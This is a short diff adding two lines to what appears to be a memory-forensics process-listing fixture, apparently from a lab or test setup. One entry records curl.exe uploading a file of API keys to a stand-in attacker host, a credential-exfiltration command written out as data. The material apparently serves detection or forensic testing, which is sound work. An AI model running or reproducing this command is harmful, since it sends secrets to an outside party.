@@ -1,0 +1,2 @@
+{"PID": 5210, "Process": "curl.exe", "Args": "curl.exe -s -F file=@C:\\Users\\lab\\secrets\\api_keys.txt https://collect.attacker-lab.test/u", "__children": []}
+{"PID": 4, "Process": "System", "Args": "Required memory at 0x20 is not valid (process exited?)", "__children": []}
